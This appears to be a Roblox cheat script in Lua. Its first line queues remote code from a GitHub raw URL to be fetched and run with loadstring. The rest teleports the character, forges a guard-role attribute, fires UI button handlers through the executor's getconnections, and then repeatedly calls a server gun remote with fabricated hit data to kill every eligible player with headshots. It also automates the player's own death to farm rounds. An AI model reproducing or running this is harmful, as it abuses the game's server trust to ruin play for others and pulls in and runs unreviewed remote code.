queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/vfx-qudsa/asfsadasdasdasdsa/refs/heads/main/.lua'))()")

local LocalPlayer = game:GetService("Players").LocalPlayer
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local PlayerKillerSettings = {
    Enabled = true,
    OnlyHeadshots = true,
    TargetDistance = 1000
}

while true do
    pcall(function()
        local teleported = false
        task.spawn(function()
            while not teleported do
                if Workspace:FindFirstChild("Shop") then
                    local humanoidRootPart = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
                    humanoidRootPart.CFrame = CFrame.new(185, 66, -26)
                    teleported = true
                    break
                end
                task.wait(0.1)
            end
        end)
        
        task.wait(1)
        
        LocalPlayer:SetAttribute("__OwnsPermGuard", true)
        local enrollFolder = LocalPlayer.PlayerGui:WaitForChild("UIHolderScreenInset"):WaitForChild("EnrollForGuardAsk")

        if getconnections then
            local button1 = enrollFolder:WaitForChild("HeaderPrompt"):WaitForChild("Green"):WaitForChild("Green")
            for _, connection in pairs(getconnections(button1.MouseButton1Click)) do
                pcall(function() connection:Fire() end)
            end
            task.wait(0.5)
            
            local button2 = enrollFolder:WaitForChild("RankSelection"):WaitForChild("EquipTier1")
            for _, connection in pairs(getconnections(button2.MouseButton1Click)) do
                pcall(function() connection:Fire() end)
            end
            task.wait(0.5)
            
            local button3 = enrollFolder:WaitForChild("RankConfirmation"):WaitForChild("Green"):WaitForChild("Green")
            for _, connection in pairs(getconnections(button3.MouseButton1Click)) do
                pcall(function() connection:Fire() end)
            end
            task.wait(1)
            
            PlayerKillerSettings.Enabled = true
            
            task.spawn(function()
                while PlayerKillerSettings.Enabled do
                    local Character = LocalPlayer.Character
                    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
                    local liveFolder = Workspace:FindFirstChild("Live")
                    local tool = Character and Character:FindFirstChildOfClass("Tool")
                    
                    if liveFolder and tool and HumanoidRootPart then
                        for _, model in pairs(liveFolder:GetChildren()) do
                            if model:IsA("Model")
                                and model.Name ~= LocalPlayer.Name
                                and model:FindFirstChild("HumanoidRootPart")
                                and model:FindFirstChild("GuardCanKill")
                            then
                                local humanoid = model:FindFirstChild("Humanoid")
                                
                                if humanoid and humanoid.Health > 0 then
                                    local hitPart = (PlayerKillerSettings.OnlyHeadshots and model:FindFirstChild("Head"))
                                        or model:FindFirstChild("HumanoidRootPart")
                                    
                                    if hitPart then
                                        pcall(function()
                                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FiredGunClient"):FireServer(
                                                tool,
                                                {
                                                    ClientRayNormal = (hitPart.Position - HumanoidRootPart.Position).Unit,
                                                    FiredGun = true,
                                                    ClientRayInstance = hitPart,
                                                    HitTargets = {hitPart},
                                                    ClientRayPosition = hitPart.Position,
                                                    FirePosition = HumanoidRootPart.Position,
                                                    Value = 1,
                                                    Ammo = 1
                                                }
                                            )
                                        end)
                                    end
                                end
                            end
                        end
                    end
                    task.wait()
                end
            end)
            
            task.spawn(function()
                local anchorDetected = false
                local disappearCount = 0
                
                while PlayerKillerSettings.Enabled do
                    local liveFolder = Workspace:FindFirstChild("Live")
                    if liveFolder then
                        local anchorExists = false
                        
                        for _, model in pairs(liveFolder:GetChildren()) do
                            if model:IsA("Model") and model:FindFirstChild("Anchor") then
                                anchorExists = true
                                break
                            end
                        end
                        
                        if anchorExists and not anchorDetected then
                            anchorDetected = true
                        elseif not anchorExists and anchorDetected then
                            disappearCount = disappearCount + 1
                            anchorDetected = false
                            
                            if disappearCount == 2 then
                                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                                if humanoid then
                                    humanoid.Health = 0
                                end
                                
                                task.wait(2)
                                
                                local button = LocalPlayer.PlayerGui:WaitForChild("Spectating").SpectateScreen.Content.ButtonOptions.ReturnLobby
                                if button and button:IsA("GuiButton") then
                                    for _, connection in pairs(getconnections(button.MouseButton1Click)) do
                                        connection:Fire()
                                    end
                                end
                                
                                PlayerKillerSettings.Enabled = false
                                break
                            end
                        end
                    end
                    task.wait(0.5)
                end
            end)
            
            task.wait(3)
        end
        
        task.wait(5)
    end)
end
